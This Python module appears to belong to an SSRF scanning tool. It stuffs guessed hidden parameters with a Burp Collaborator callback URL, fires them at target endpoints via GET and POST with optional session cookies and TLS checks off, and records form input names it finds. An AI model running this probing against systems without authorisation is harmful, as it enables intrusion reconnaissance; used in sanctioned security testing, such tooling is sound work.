import warnings

import requests
import lxml
import core.ThreadedStart as ThreadedStart
from core import ParseParams

endpoints = []
hidden_params = []

get_last_param = ""
post_last_param = ""

def parseParams(param_file):
    global hidden_params
    hidden_params = ParseParams.parseParams(param_file)

def checkParamInUrl(endpoint, param):
    if ("?" + param) in endpoint or ("&" + param) in endpoint:
        return True

def grabHiddenParameters(endpoint, content):
    htmltree = lxml.html.fromstring(content)
    try:
        for input_el in htmltree.xpath('//input'):
            name = input_el.attrib['name']
            writeHiddenInputs(str(endpoint) + " : " + str(name))
    except Exception as e:
        print('Collection exception: ' + str(e))


def writeHiddenInputs(message):
    with open(ThreadedStart.collect_input_types, "a") as file:
        file.write(str(message + "\n"))


def testSSRFGET(endpoint, index, auth_cookie, thread_id):
    warnings.filterwarnings("ignore")
    global hidden_params
    global get_last_param
    endpoint = endpoint.replace("\n", "")
    i = 1
    count = 0
    url = ""
    print("thread id: " + str(thread_id) + ":" + str(endpoint))
    if "https://" in endpoint:
        addon = endpoint.replace("https://", "")
    else:
        addon = endpoint.replace("http://", "")
    for param in hidden_params:
        count += 1
        param = param.replace("\n", "")

        if ThreadedStart.filtered_params:
            if ThreadedStart.filtered_params_array.count(param) > 0:
                continue

        if i <= 1:
            if "?" in endpoint:
                if param in endpoint and checkParamInUrl(endpoint, param):
                    split_params = endpoint.split("?")
                    ggg = split_params[1].split("&")
                    for g in ggg:
                        jj = g.split("=")
                        if jj[0] == param:
                            if ThreadedStart.burp_collab not in jj[1]:
                                jj[1] = ThreadedStart.burp_collab + "/" + addon + "?" + param
                                g = (jj[0] + jj[1])
                                url = split_params[0] + "?" + g
                                i += 1
                                for gg in ggg:
                                    zz = gg.split("=")
                                    if zz[0] not in url:
                                        url = url + "&" + gg
                else:
                    url = endpoint + "&" + param + "=" + ThreadedStart.burp_collab + "/" + addon + "?" + param
                    i += 1
            else:
                url = endpoint + "?" + param + "=" + ThreadedStart.burp_collab + "/" + addon + "?" + param
                i += 1
        else:
            if param in endpoint and checkParamInUrl(endpoint, param):
                split_params = endpoint.split("?")
                ggg = split_params[1].split("&")
                for g in ggg:
                    jj = g.split("=")
                    if jj[0] == param:
                        if ThreadedStart.burp_collab not in jj[1]:
                            url = url.replace(g, param + "=" + ThreadedStart.burp_collab + "/" + addon + "?" + param)
                            i += 1
            else:
                url = url + "&" + param + "=" + ThreadedStart.burp_collab + "/" + addon + "?" + param
                i += 1

        if i == 17:
            # print(endpoint)
            # print(count)
            # print(url)
            if str(auth_cookie) != "{}":
                response = requests.get(url, cookies=auth_cookie, verify=False)
            else:
                response = requests.get(url, verify=False)
            content = response.content
            if str(content).find("advancedsearch2.") > 0:
                return
            #analyseGETRequests(url, str(content), index)
            if ThreadedStart.collect_input_types != "" and ThreadedStart.hidden_collected_index[index] == 'false':
                ThreadedStart.hidden_collected_index[index] = 'true'
                print("Collecting...")
                grabHiddenParameters(endpoint, content)
            i = 0

    if count > 0:
        if ThreadedStart.recursive or ThreadedStart.get_reflected_param[index] != "true":
            if str(auth_cookie) != "{}":
                response = requests.get(url, cookies=auth_cookie, verify=False)
            else:
                response = requests.get(url, verify=False)
            content = response.content
            if str(content).find("advancedsearch2.") > 0:
                return
            #analyseGETRequests(url, str(content), index)


def testSSRFPOST(endpoint, index, auth_cookie, thread_id):
    warnings.filterwarnings("ignore")
    global hidden_params
    global post_last_param
    test = []
    vals = {}
    endpoint = endpoint.replace("\n", "")
    i = 1
    count = 0
    url = ""
    print("thread id: " + str(thread_id) + ":" + str(endpoint))
    if "https://" in endpoint:
        addon = endpoint.replace("https://", "")
    else:
        addon = endpoint.replace("http://", "")
    for param in hidden_params:
        count += 1

        param = param.replace("\n", "")

        if ThreadedStart.filtered_params:
            if ThreadedStart.filtered_params_array.count(param) > 0:
                continue

        test.append([param, ThreadedStart.burp_collab + "/" + addon + "?" + param])
        for product in test:
            vals['' + product[0]] = product[1]

        if i <= 1:
            url = url + param + "=" + ThreadedStart.burp_collab + "/" + addon + "?" + param
            i += 1
        else:
            url = url + "&" + param + "=" + ThreadedStart.burp_collab + "/" + addon + "?" + param
            i += 1

        if i == 33:
            #print(vals)
            #print(url)
            #print(url)
            if str(auth_cookie) != "{}":
                response = requests.post(endpoint, data=vals, cookies=auth_cookie, verify=False)
            else:
                response = requests.post(endpoint, data=vals, verify=False)
            content = response.content
            if str(content).find("advancedsearch2.") > 0:
                return
            if ThreadedStart.collect_input_types != "" and ThreadedStart.hidden_collected_index[index] == 'false':
                ThreadedStart.hidden_collected_index[index] = 'true'
                print("Collecting...")
                grabHiddenParameters(endpoint, content)
            url = ""
            vals = {}
            test = []
            i = 0

    if count > 0:
        if ThreadedStart.recursive or ThreadedStart.post_reflected_param[index] != "true":
            if str(auth_cookie) != "{}":
                response = requests.post(endpoint, data=vals, cookies=auth_cookie, verify=False)
            else:
                response = requests.post(endpoint, data=vals, verify=False)
            content = response.content
            if str(content).find("advancedsearch2.") > 0:
                return
